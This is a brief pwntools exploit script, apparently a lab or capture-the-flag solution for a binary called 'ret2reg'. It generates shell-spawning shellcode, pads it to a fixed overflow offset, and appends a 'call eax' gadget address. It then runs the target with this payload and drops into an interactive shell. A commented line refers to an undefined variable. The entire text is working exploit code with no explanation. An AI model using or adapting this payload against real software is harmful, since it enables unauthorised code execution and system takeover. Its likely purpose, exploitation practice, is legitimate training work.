#!/usr/bin/env python3
from pwn import *

#sh = process('./ret2reg')
shellcode = asm(shellcraft.sh())
calleax_addr = 0x08049019
offset = 0x208 + 4

shellpad = shellcode + (offset - len(shellcode)) * b'A' + p32(calleax_addr)
print(shellpad)
sh = process('./ret2reg',  argv=shellpad, shell=True)
#sh.sendline(shellpad + p32(calledx_addr))
sh.interactive()
